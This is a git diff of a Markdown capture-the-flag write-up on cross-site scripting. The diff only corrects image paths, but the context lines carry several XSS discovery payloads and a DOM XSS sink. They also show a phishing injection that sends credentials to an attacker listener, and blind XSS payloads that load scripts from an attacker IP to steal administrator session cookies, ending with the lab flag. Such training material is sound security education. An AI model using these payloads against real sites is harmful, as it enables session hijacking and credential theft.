@@ -57,7 +57,7 @@ A common initial discovery payload leverages the JavaScript `alert()` function t
 task=<script>alert(window.origin)</script>
 ```
 
-![Filtered output](..images/xss-discovery.png)
+![Filtered output](./.images/xss-discovery.png)
 
 The same technique can be used to display the user’s **session cookies**, which demonstrates the potential for session hijacking:
 
@@ -69,7 +69,7 @@ The same technique can be used to display the user’s **session cookies**, whic
 task=<script>alert(document.cookie)</script>
 ```
 
-![Filtered output](..images/xss-discovery2.png)
+![Filtered output](./.images/xss-discovery2.png)
 
 Modern browsers or application-level defenses may block the `alert()` function. In such cases, alternative payloads that do not rely on `alert()` are useful for confirming exploitability.
 
@@ -83,7 +83,7 @@ One such technique uses the HTML `<plaintext>` tag, which causes the browser to 
 task=<plaintext>
 ```
 
-![Filtered output](..images/xss-discovery3.png)
+![Filtered output](./.images/xss-discovery3.png)
 
 Another common discovery payload invokes the browser’s print dialog using the `print()` function:
 
@@ -95,7 +95,7 @@ Another common discovery payload invokes the browser’s print dialog using the 
 task=<script>print()</script>
 ```
 
-![Filtered output](..images/xss-discovery4.png)
+![Filtered output](./.images/xss-discovery4.png)
 
 **Note for Defenders:**
 
@@ -115,7 +115,7 @@ When attempting to add a task named `test` in the target application, the server
 Task 'test' could not be added.
 ```
 
-![Filtered output](..images/xss-reflected.png)
+![Filtered output](./.images/xss-reflected.png)
 
 This behavior indicates that the application is **reflecting user input** back into the response without proper output encoding. 
 
@@ -129,15 +129,15 @@ To test for reflected XSS, we can reuse the same discovery payloads used for sto
 task=<script>alert(window.origin)</script>
 ```
 
-![Filtered output](..images/xss-reflected2.png)
+![Filtered output](./.images/xss-reflected2.png)
 
 The payload executes successfully, confirming that injected JavaScript is being interpreted by the browser. Inspecting the page source reveals that the payload is embedded directly in the HTML returned by the server.
 
-![Filtered output](..images/xss-reflected3.png)
+![Filtered output](./.images/xss-reflected3.png)
 
 After refreshing or revisiting the page, the payload is no longer present in the server response. This confirms that the vulnerability is **reflected**, not stored.
 
-![Filtered output](..images/xss-reflected4.png)
+![Filtered output](./.images/xss-reflected4.png)
 
 Because reflected XSS payloads are not stored on the server, they must be delivered to the victim at the time of execution. This is typically achieved by embedding the payload in a **crafted URL** and convincing the victim to visit it (for example, via phishing or social engineering).
 
@@ -163,7 +163,7 @@ When attempting to add a task named `test`, we observe that the application upda
 http://94.237.57.115:55333/#task=test
 ```
 
-![Filtered output](..images/dom-xss.png)
+![Filtered output](./.images/dom-xss.png)
 
 The `#` character indicates a **client-side parameter** (URL fragment). Fragment identifiers are processed entirely by the browser and are **never sent to the server** as part of an HTTP request. This behavior strongly suggests a DOM-based vulnerability.
 
@@ -191,7 +191,7 @@ var task = document.URL.substring(pos + 5, document.URL.length);
 document.getElementById("todo").innerHTML = "<b>Next Task:</b> " + decodeURIComponent(task);
 ```
 
-![Filtered output](..images/dom-xss2.png)
+![Filtered output](./.images/dom-xss2.png)
 
 Because the application uses `innerHTML` without sanitization, user-controlled input is injected directly into the DOM, creating a DOM XSS vulnerability.
 
@@ -213,7 +213,7 @@ task=<img src="" onerror=alert(window.origin)>
 task=<img src="" onerror=alert(document.cookie)>
 ```
 
-![Filtered output](..images/dom-xss3.png)
+![Filtered output](./.images/dom-xss3.png)
 
 Because DOM XSS vulnerabilities are **non-persistent**, payloads must be delivered **at the time of execution**. This is typically accomplished by crafting a malicious URL and persuading a victim to visit it (e.g., via phishing or social engineering).
 
@@ -255,11 +255,11 @@ If a URL contains multiple parameters, `XSStrike` will automatically enumerate a
 python xsstrike.py -u "http://94.237.50.221:32974/?fullname=Test&username=Tester&password=123&email=test%40tester.com"
 ```
 
-![Filtered output](..images/dom-xss4.png)
+![Filtered output](./.images/dom-xss4.png)
 
 In this case, XSStrike identified a reflected XSS vulnerability in the email parameter. The tool then generated multiple payloads suitable for the detected injection context.
 
-![Filtered output](..images/dom-xss5.png)
+![Filtered output](./.images/dom-xss5.png)
 
 ---
 
@@ -275,7 +275,7 @@ Assume we are assessing a web application that functions as a simple image viewe
 http://10.129.133.125/phishing/
 ```
 
-![Filtered output](..images/phishing.png)
+![Filtered output](./.images/phishing.png)
 
 As a first step, we test the application for XSS vulnerabilities using `XSStrike`:
 
@@ -283,7 +283,7 @@ As a first step, we test the application for XSS vulnerabilities using `XSStrike
 python xsstrike.py -u "http://10.129.133.125/phishing/index.php?url=test"
 ```
 
-![Filtered output](..images/phishing2.png)
+![Filtered output](./.images/phishing2.png)
 
 `XSStrike` dentifies several working payloads. We begin by testing the following reflected payload:
 
@@ -291,7 +291,7 @@ python xsstrike.py -u "http://10.129.133.125/phishing/index.php?url=test"
 http://10.129.133.125/phishing/index.php?url='><D3V%0doNpoINtEreNTEr%0d=%0dconfirm()>v3dm0s
 ```
 
-![Filtered output](..images/phishing3.png)
+![Filtered output](./.images/phishing3.png)
 
 The payload is reflected and executed, confirming the presence of a **reflected XSS vulnerability**.
 
@@ -301,7 +301,7 @@ Next, we modify the payload to execute arbitrary JavaScript. As a proof of execu
 http://10.129.133.125/phishing/index.php?url='><D3V%0doNpoINtEreNTEr%0d=%0dconfirm()><img src="" onerror=alert(window.origin)>
 ```
 
-![Filtered output](..images/phishing4.png)
+![Filtered output](./.images/phishing4.png)
 
 Successful execution confirms that we can inject and run JavaScript in the victim’s browser.
 
@@ -332,7 +332,7 @@ Injected via the confirmed vector:
 0doNpoINtEreNTEr%0d=%0dconfirm()>document.write('minimized code goes here')
 ```
 
-![Filtered output](..images/phishing5.png)
+![Filtered output](./.images/phishing5.png)
 
 Before sending the crafted URL to the victim, we start a listener to receive the submitted credentials. This can be done using several common tools:
 
@@ -352,7 +352,7 @@ or:
 sudo php -S 0.0.0.0:8001
 ```
 
-![Filtered output](..images/phishing6.png)
+![Filtered output](./.images/phishing6.png)
 
 When the victim submits the fake login form, their credentials are sent directly to the attacker-controlled server, completing the phishing attack.
 
@@ -374,7 +374,7 @@ In these cases, the attacker does not immediately see the result of the payload 
 Thank you for registering. An Admin will review your request.
 ```
 
-![Filtered output](..images/session-hijacking.png)
+![Filtered output](./.images/session-hijacking.png)
 
 Because no visible output is returned, the attacker must rely on **out-of-band interaction** to confirm whether the payload executed successfully.
 
@@ -434,11 +434,11 @@ Inject payloads into different form fields, adjusting the requested path to iden
 "><script src=http://10.10.14.172:8001/profile></script>
 ```
 
-![Filtered output](..images/session-hijacking2.png)
+![Filtered output](./.images/session-hijacking2.png)
 
 A request is received for the `/profile` path, indicating that the `profile` field is vulnerable to XSS.
 
-![Filtered output](..images/session-hijacking3.png)
+![Filtered output](./.images/session-hijacking3.png)
 
 **Step 3: Create the Cookie-Stealing Script**
 
@@ -474,11 +474,11 @@ http://10.129.222.16/hijacking/login.php
 
 Open the browser’s developer tools and locate the `cookie storage`. Insert the stolen cookie name and value manually.
 
-![Filtered output](..images/session-hijacking4.png)
+![Filtered output](./.images/session-hijacking4.png)
 
 After refreshing the page, the attacker gains authenticated access as the victim:
 
-![Filtered output](..images/session-hijacking5.png)
+![Filtered output](./.images/session-hijacking5.png)
 
 ---
 
@@ -500,15 +500,15 @@ http://10.129.221.80/assessment/
 
 The application appears to be a security-focused blog.
 
-![Filtered output](..images/skill-assessment.png)
+![Filtered output](./.images/skill-assessment.png)
 
 A comment section is present on the blog, containing multiple user-input fields. Comment sections are common attack surfaces and prime candidates for XSS testing.
 
-![Filtered output](..images/skill-assessment2.png)
+![Filtered output](./.images/skill-assessment2.png)
 
 After submitting a test comment, the application responds with a message indicating that comments require **administrative approval**.
 
-![Filtered output](..images/skill-assessment3.png)
+![Filtered output](./.images/skill-assessment3.png)
 
 This behavior strongly suggests the presence of a **blind XSS vulnerability**, as the injected payload is likely rendered in an administrative interface that we do not have direct access to. As a result, we must rely on **out-of-band interaction** to confirm payload execution and exfiltrate data.
 
@@ -538,7 +538,7 @@ The `email` field is typically skipped, as it often enforces strict format valid
 
 A request is received for the `/website` path, confirming that the `website` field is vulnerable to blind XSS.
 
-![Filtered output](..images/skill-assessment4.png)
+![Filtered output](./.images/skill-assessment4.png)
 
 **Step 3: Create the Cookie-Stealing Script**
 
@@ -558,7 +558,7 @@ We inject a final payload into the vulnerable `website field`, instructing the v
 "><script src=http://10.10.14.172:8001/script.js></script>
 ```
 
-![Filtered output](..images/skill-assessment5.png)
+![Filtered output](./.images/skill-assessment5.png)
 
 When an administrator reviews the comment, the payload executes, and the session cookie is sent to our server.
 
@@ -568,6 +568,6 @@ The exfiltrated session cookie contains the final flag, completing the assessmen
 HTB{cr055_5173_5cr1p71n6_n1nj4}
 ```
 
-![Filtered output](..images/skill-assessment6.png)
+![Filtered output](./.images/skill-assessment6.png)
 
 
